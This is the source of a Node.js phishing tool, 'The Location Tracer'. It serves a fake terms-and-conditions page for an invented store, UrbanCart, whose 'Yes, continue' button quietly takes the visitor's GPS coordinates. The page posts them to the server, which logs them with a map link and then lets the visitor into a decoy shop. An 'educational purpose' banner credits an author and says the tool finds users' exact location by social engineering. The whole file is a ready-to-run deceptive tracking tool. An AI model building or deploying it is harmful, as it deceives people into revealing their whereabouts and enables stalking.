const http = require('http');
const PORT = 4444;

// Store user sessions
const userSessions = new Map();

// SHOPPING PAGE HTML (Properly escaped)
const SHOPPING_PAGE = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>UrbanCart - Shopping Website</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { background: white; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 100; }
        .logo { font-size: 28px; font-weight: bold; background: linear-gradient(135deg, #2463eb, #1a4fc3); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .nav { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
        .search-box { display: flex; gap: 10px; }
        .search-box input { padding: 10px; border: 1px solid #ddd; border-radius: 25px; width: 250px; }
        .search-box button { background: #2463eb; color: white; border: none; padding: 10px 20px; border-radius: 25px; cursor: pointer; }
        .cart-icon { background: #f0f2f6; padding: 8px 18px; border-radius: 25px; cursor: pointer; font-weight: 600; }
        .cart-count { background: #e53e3e; color: white; border-radius: 50%; padding: 2px 8px; margin-left: 5px; }
        .hero { background: linear-gradient(120deg, #f0f5ff, #e9effa); padding: 50px; text-align: center; border-radius: 20px; margin: 20px 0; }
        .hero h1 { font-size: 2.5rem; color: #1e293b; }
        .categories { display: flex; gap: 15px; justify-content: center; margin: 30px 0; flex-wrap: wrap; }
        .category-btn { background: white; border: 1px solid #ddd; padding: 8px 25px; border-radius: 25px; cursor: pointer; transition: 0.3s; }
        .category-btn.active, .category-btn:hover { background: #2463eb; color: white; border-color: #2463eb; }
        .products { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; margin: 30px 0; }
        .product { background: white; border-radius: 15px; padding: 20px; text-align: center; transition: transform 0.3s, box-shadow 0.3s; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
        .product:hover { transform: translateY(-5px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        .product-emoji { font-size: 60px; margin-bottom: 10px; }
        .product-name { font-size: 18px; font-weight: 600; margin: 10px 0; }
        .product-category { font-size: 12px; color: #2463eb; background: #eef2ff; display: inline-block; padding: 3px 12px; border-radius: 20px; margin: 8px 0; }
        .product-price { font-size: 24px; font-weight: bold; color: #2463eb; margin: 10px 0; }
        .add-btn { background: #1e293b; color: white; border: none; padding: 10px 20px; border-radius: 25px; cursor: pointer; width: 100%; font-size: 16px; transition: 0.3s; }
        .add-btn:hover { background: #2463eb; }
        .cart-sidebar { position: fixed; right: -400px; top: 0; width: 380px; height: 100%; background: white; box-shadow: -2px 0 10px rgba(0,0,0,0.1); transition: 0.3s; z-index: 1000; padding: 20px; overflow-y: auto; }
        .cart-sidebar.open { right: 0; }
        .cart-header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 2px solid #eee; margin-bottom: 15px; }
        .close-cart { background: none; border: none; font-size: 24px; cursor: pointer; }
        .cart-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #eee; }
        .cart-item-info { flex: 1; }
        .cart-item-title { font-weight: 600; }
        .cart-item-price { color: #2463eb; }
        .cart-item-quantity { display: flex; align-items: center; gap: 10px; }
        .qty-btn { background: #f0f2f6; border: none; width: 25px; height: 25px; border-radius: 50%; cursor: pointer; }
        .cart-total { padding: 15px 0; font-size: 20px; font-weight: bold; text-align: right; border-top: 2px solid #eee; margin-top: 15px; }
        .checkout-btn { background: #2463eb; color: white; border: none; padding: 12px; border-radius: 25px; width: 100%; font-size: 16px; cursor: pointer; margin-top: 15px; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: none; z-index: 999; }
        .overlay.show { display: block; }
        footer { text-align: center; padding: 30px; background: white; margin-top: 40px; color: #666; }
        @media (max-width: 768px) {
            .nav { flex-direction: column; }
            .search-box input { width: 100%; }
            .cart-sidebar { width: 100%; right: -100%; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="container">
            <div class="nav">
                <div class="logo">🛍️ UrbanCart</div>
                <div class="search-box">
                    <input type="text" id="searchInput" placeholder="Search products...">
                    <button id="searchBtn">Search</button>
                </div>
                <div class="cart-icon" id="cartIcon">
                    🛒 Cart <span class="cart-count" id="cartCount">0</span>
                </div>
            </div>
        </div>
    </div>
    
    <div class="container">
        <div class="hero">
            <h1>Welcome to UrbanCart ✨</h1>
            <p>Discover amazing products at best prices!</p>
        </div>
        
        <div class="categories" id="categories"></div>
        <div class="products" id="products"></div>
    </div>
    
    <div class="overlay" id="overlay"></div>
    <div class="cart-sidebar" id="cartSidebar">
        <div class="cart-header">
            <h3>Your Cart 🛍️</h3>
            <button class="close-cart" id="closeCart">&times;</button>
        </div>
        <div id="cartItems"></div>
        <div class="cart-total" id="cartTotal">Total: ₹0</div>
        <button class="checkout-btn" id="checkoutBtn">Proceed to Checkout</button>
    </div>
    
    <footer>
        <p>© 2025 UrbanCart - All Rights Reserved</p>
    </footer>
    
    <script>
        const products = [
            { id: 1, name: "Premium Leather Backpack", category: "Bags", price: 3499, emoji: "🎒", tags: ["leather", "bag"] },
            { id: 2, name: "Wireless Noise Cancelling Buds", category: "Electronics", price: 1999, emoji: "🎧", tags: ["wireless", "audio"] },
            { id: 3, name: "Minimalist Analog Watch", category: "Accessories", price: 2899, emoji: "⌚", tags: ["watch"] },
            { id: 4, name: "Cotton Oversized T-Shirt", category: "Clothing", price: 1299, emoji: "👕", tags: ["cotton"] },
            { id: 5, name: "Slim Fit Denim Jeans", category: "Clothing", price: 2499, emoji: "👖", tags: ["denim"] },
            { id: 6, name: "Smart LED Desk Lamp", category: "Electronics", price: 1599, emoji: "💡", tags: ["lamp"] },
            { id: 7, name: "Leather Card Holder Wallet", category: "Accessories", price: 899, emoji: "👛", tags: ["leather"] },
            { id: 8, name: "Running Sports Sneakers", category: "Footwear", price: 3999, emoji: "👟", tags: ["sneakers"] },
            { id: 9, name: "Polarized Sunglasses", category: "Accessories", price: 1799, emoji: "🕶️", tags: ["sunglasses"] },
            { id: 10, name: "Laptop Sleeve 14 inch", category: "Bags", price: 999, emoji: "💼", tags: ["laptop"] },
            { id: 11, name: "Bamboo Cutting Board", category: "Home", price: 799, emoji: "🍳", tags: ["kitchen"] },
            { id: 12, name: "Ceramic Coffee Mug", category: "Home", price: 449, emoji: "☕", tags: ["mug"] },
            { id: 13, name: "Smart Fitness Band", category: "Electronics", price: 2999, emoji: "⌚", tags: ["fitness"] },
            { id: 14, name: "Travel Duffel Bag", category: "Bags", price: 2799, emoji: "🧳", tags: ["travel"] },
            { id: 15, name: "Wireless Gaming Mouse", category: "Electronics", price: 1599, emoji: "🖱️", tags: ["gaming"] }
        ];
        
        let cart = [];
        let currentCategory = "all";
        let searchQuery = "";
        
        function saveCart() { localStorage.setItem("urbanCart", JSON.stringify(cart)); }
        function loadCart() { const saved = localStorage.getItem("urbanCart"); if(saved) cart = JSON.parse(saved); updateCartUI(); }
        
        function updateCartUI() {
            const totalItems = cart.reduce((s, i) => s + i.quantity, 0);
            document.getElementById("cartCount").innerText = totalItems;
            
            const cartItemsDiv = document.getElementById("cartItems");
            if(cart.length === 0) {
                cartItemsDiv.innerHTML = '<p style="text-align:center; padding:40px;">Cart is empty 😢</p>';
                document.getElementById("cartTotal").innerHTML = "Total: ₹0";
                return;
            }
            
            let total = 0;
            cartItemsDiv.innerHTML = "";
            for(let i = 0; i < cart.length; i++) {
                const item = cart[i];
                const itemTotal = item.price * item.quantity;
                total += itemTotal;
                const div = document.createElement("div");
                div.className = "cart-item";
                div.innerHTML = '<div class="cart-item-info"><div class="cart-item-title">' + item.name + '</div><div class="cart-item-price">₹' + item.price + '</div></div><div class="cart-item-quantity"><button class="qty-btn" onclick="updateQuantity(' + item.id + ', -1)">-</button><span>' + item.quantity + '</span><button class="qty-btn" onclick="updateQuantity(' + item.id + ', 1)">+</button><button class="qty-btn" onclick="removeFromCart(' + item.id + ')" style="background:#fee;">🗑️</button></div>';
                cartItemsDiv.appendChild(div);
            }
            document.getElementById("cartTotal").innerHTML = "Total: ₹" + total.toLocaleString();
        }
        
        window.updateQuantity = function(id, delta) {
            const index = cart.findIndex(item => item.id === id);
            if(index !== -1) {
                cart[index].quantity += delta;
                if(cart[index].quantity <= 0) {
                    cart.splice(index, 1);
                }
                saveCart();
                updateCartUI();
                renderProducts();
            }
        }
        
        window.removeFromCart = function(id) {
            cart = cart.filter(item => item.id !== id);
            saveCart();
            updateCartUI();
            renderProducts();
        }
        
        window.addToCart = function(product) {
            const existing = cart.find(item => item.id === product.id);
            if(existing) {
                existing.quantity++;
            } else {
                cart.push({ id: product.id, name: product.name, price: product.price, quantity: 1, emoji: product.emoji });
            }
            saveCart();
            updateCartUI();
            renderProducts();
        }
        
        function isInCart(id) {
            const item = cart.find(item => item.id === id);
            return item ? item.quantity : 0;
        }
        
        function getFilteredProducts() {
            let filtered = [...products];
            if(currentCategory !== "all") {
                filtered = filtered.filter(p => p.category === currentCategory);
            }
            if(searchQuery.trim() !== "") {
                const q = searchQuery.toLowerCase();
                filtered = filtered.filter(p => p.name.toLowerCase().includes(q) || p.tags.some(tag => tag.toLowerCase().includes(q)));
            }
            return filtered;
        }
        
        function renderProducts() {
            const filtered = getFilteredProducts();
            const productsDiv = document.getElementById("products");
            
            if(filtered.length === 0) {
                productsDiv.innerHTML = '<div style="grid-column:1/-1; text-align:center; padding:50px;">No products found 😢</div>';
                return;
            }
            
            productsDiv.innerHTML = "";
            for(let i = 0; i < filtered.length; i++) {
                const p = filtered[i];
                const qty = isInCart(p.id);
                const div = document.createElement("div");
                div.className = "product";
                div.innerHTML = '<div class="product-emoji">' + p.emoji + '</div><div class="product-name">' + p.name + '</div><div class="product-category">' + p.category + '</div><div class="product-price">₹' + p.price.toLocaleString() + '</div><button class="add-btn" onclick="addToCart(products.find(pr => pr.id === ' + p.id + '))">' + (qty > 0 ? '✓ In Cart (' + qty + ')' : '➕ Add to Cart') + '</button>';
                productsDiv.appendChild(div);
            }
        }
        
        function renderCategories() {
            const categories = ["all", ...new Set(products.map(p => p.category))];
            const categoriesDiv = document.getElementById("categories");
            categoriesDiv.innerHTML = "";
            for(let i = 0; i < categories.length; i++) {
                const cat = categories[i];
                const displayName = cat === "all" ? "All" : cat;
                const btn = document.createElement("button");
                btn.className = "category-btn" + (currentCategory === cat ? " active" : "");
                btn.textContent = displayName;
                btn.onclick = function() { setCategory(cat); };
                categoriesDiv.appendChild(btn);
            }
        }
        
        function setCategory(cat) {
            currentCategory = cat;
            renderCategories();
            renderProducts();
        }
        
        function performSearch() {
            searchQuery = document.getElementById("searchInput").value;
            renderProducts();
        }
        
        function openCart() {
            document.getElementById("cartSidebar").classList.add("open");
            document.getElementById("overlay").classList.add("show");
        }
        
        function closeCart() {
            document.getElementById("cartSidebar").classList.remove("open");
            document.getElementById("overlay").classList.remove("show");
        }
        
        function checkout() {
            if(cart.length === 0) {
                alert("Your cart is empty! Add some products first.");
            } else {
                const total = cart.reduce((s, i) => s + (i.price * i.quantity), 0);
                alert("🎉 Order placed successfully!\\n\\nTotal Amount: ₹" + total.toLocaleString() + "\\nThank you for shopping at UrbanCart!");
                cart = [];
                saveCart();
                updateCartUI();
                renderProducts();
                closeCart();
            }
        }
        
        document.getElementById("searchBtn").addEventListener("click", performSearch);
        document.getElementById("searchInput").addEventListener("keyup", function(e) { if(e.key === "Enter") performSearch(); });
        document.getElementById("cartIcon").addEventListener("click", openCart);
        document.getElementById("closeCart").addEventListener("click", closeCart);
        document.getElementById("overlay").addEventListener("click", closeCart);
        document.getElementById("checkoutBtn").addEventListener("click", checkout);
        
        loadCart();
        renderCategories();
        renderProducts();
    </script>
</body>
</html>`;

// PERMISSION PAGE HTML
function getPermissionPage(sessionId) {
    return `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Location Permission Required - UrbanCart</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea, #764ba2);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            max-width: 450px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon { font-size: 80px; margin-bottom: 20px; }
        h1 { color: #333; margin-bottom: 15px; }
        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
        button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px;
        }
        .exit-btn { background: #dc3545; }
        .status { margin-top: 20px; padding: 10px; background: #e3f2fd; border-radius: 10px; color: #1976d2; }
        .error { background: #fee; color: #c33; display: none; margin-top: 20px; padding: 10px; border-radius: 10px; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">📍</div>
        <h1>Terms & Conditions</h1>
        <p>If you want to shop with our Urbankarat then continue this</p>
        <button id="allowBtn">Yes, continue</button>
        <button class="exit-btn" id="exitBtn">Exit</button>
        <div id="statusMsg" class="status">Click "Yes, continue" to continue</div>
        <div id="errorMsg" class="error"></div>
    </div>
    
    <script>
        const sessionId = "${sessionId}";
        
        async function requestLocation() {
            const btn = document.getElementById('allowBtn');
            const statusDiv = document.getElementById('statusMsg');
            const errorDiv = document.getElementById('errorMsg');
            
            btn.disabled = true;
            btn.innerHTML = '<span class="loading"></span> Entering Please Wait';
            errorDiv.style.display = 'none';
            
            if(!navigator.geolocation) {
                showError('Geolocation not supported');
                btn.disabled = false;
                btn.innerHTML = 'Yes, continue';
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    statusDiv.innerHTML = '📍 Location obtained! Sending to server...';
                    
                    try {
                        const response = await fetch('/api/location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                                'X-Session-Id': sessionId
                            },
                            body: JSON.stringify({ coordinates: { lat: lat, lng: lng } })
                        });
                        
                        const data = await response.json();
                        
                        if(data.success) {
                            statusDiv.innerHTML = '✅ Verified! Redirecting...';
                            setTimeout(() => {
                                window.location.href = '/shop';
                            }, 1000);
                        } else {
                            showError('Verification failed');
                            btn.disabled = false;
                            btn.innerHTML = 'Allow Location Access';
                        }
                    } catch(error) {
                        showError('Server error: ' + error.message);
                        btn.disabled = false;
                        btn.innerHTML = 'Allow Location Access';
                    }
                },
                (error) => {
                    let msg = error.code === 1 ? '❌ Permission denied' : '❌ Location error';
                    showError(msg);
                    btn.disabled = false;
                    btn.innerHTML = 'Allow Location Access';
                }
            );
        }
        
        function showError(msg) {
            const errorDiv = document.getElementById('errorMsg');
            const statusDiv = document.getElementById('statusMsg');
            errorDiv.innerHTML = msg;
            errorDiv.style.display = 'block';
            statusDiv.innerHTML = '⚠️ ' + msg;
        }
        
        document.getElementById('allowBtn').onclick = requestLocation;
        document.getElementById('exitBtn').onclick = () => window.location.href = 'about:blank';
    </script>
</body>
</html>`;
}

// Create server
const server = http.createServer((req, res) => {
    console.log(req.method + ' ' + req.url);
    
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Session-Id');
    
    if (req.method === 'OPTIONS') {
        res.writeHead(204);
        res.end();
        return;
    }
    
    // Get session ID from cookie
    let sessionId = null;
    const cookies = req.headers.cookie || '';
    const cookieMatch = cookies.match(/sessionId=([^;]+)/);
    if (cookieMatch) {
        sessionId = cookieMatch[1];
    }
    
    // API: Receive location
    if (req.url === '/api/location' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                const sessId = req.headers['x-session-id'];
                
                if (sessId) {
                    userSessions.set(sessId, {
                        lat: data.coordinates.lat,
                        lng: data.coordinates.lng,
                        timestamp: new Date()
                    });
                    
                    console.log('\n=========================================');
                    console.log('✅ LOCATION RECEIVED!');
                    console.log('📍 Latitude: ' + data.coordinates.lat);
                    console.log('📍 Longitude: ' + data.coordinates.lng);
                    console.log('🗺️ Google Maps: https://www.google.com/maps?q=' + data.coordinates.lat + ',' + data.coordinates.lng);
                    console.log('=========================================\n');
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ success: true }));
                } else {
                    throw new Error('No session');
                }
            } catch(e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: false, error: e.message }));
            }
        });
        return;
    }
    
    // API: Get location
    if (req.url === '/api/get-location' && req.method === 'GET') {
        const sessId = req.headers['x-session-id'];
        if (sessId && userSessions.has(sessId)) {
            const loc = userSessions.get(sessId);
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ latitude: loc.lat, longitude: loc.lng }));
        } else {
            res.writeHead(404, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'No location found' }));
        }
        return;
    }
    
    // Shop page
    if (req.url === '/shop') {
        if (sessionId && userSessions.has(sessionId)) {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(SHOPPING_PAGE);
        } else {
            res.writeHead(302, { 'Location': '/' });
            res.end();
        }
        return;
    }
    
    // Main page
    if (req.url === '/') {
        const newSessionId = Math.random().toString(36).substring(2) + Date.now();
        res.setHeader('Set-Cookie', 'sessionId=' + newSessionId + '; Path=/');
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(getPermissionPage(newSessionId));
        return;
    }
    
    res.writeHead(404);
    res.end('Page not found');
});


console.log('\n╔═════════════════════════════════════════════════════════════════════════════════════════════════════╗');
    console.log('║ ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██████╗  ██████╗ ██╗   ██╗████████╗███████╗             ║');
    console.log('║ ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝██╔════╝             ║');
    console.log('║ ██████╔╝██║     ███████║██║     █████╔╝     ██████╔╝██║   ██║██║   ██║   ██║   █████╗               ║');
    console.log('║ ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔══██╗██║   ██║██║   ██║   ██║   ██╔══╝               ║');
    console.log('║ ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██║  ██║╚██████╔╝╚██████╔╝   ██║   ███████╗             ║');
    console.log('║ ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝   ╚══════╝             ║');
    console.log('║                                     The Location Tracer                                             ║');
    console.log('╚═════════════════════════════════════════════════════════════════════════════════════════════════════╝');



// Start server
server.listen(PORT, () => {

    console.log(' \n                                               Warning    ');
    console.log(' \n                             This Tool Is Only For Educational Purpose  ');
    console.log(' \n    ==================================================================================================================');
    console.log(' \n    Author: Gulshan Kumar                                    ');
    console.log('    Instagram: instagram.com/r3b00tm4st3r         ');
    console.log('    Discription: This tool helps in finding the exact location of the user with the help of social engineering method. ');
    console.log('    feachers: Costom shopping Website ');
    console.log(' \n    ==================================================================================================================');
    console.log('\n👉 Open browser: http://localhost:' + PORT + '/\n');
});
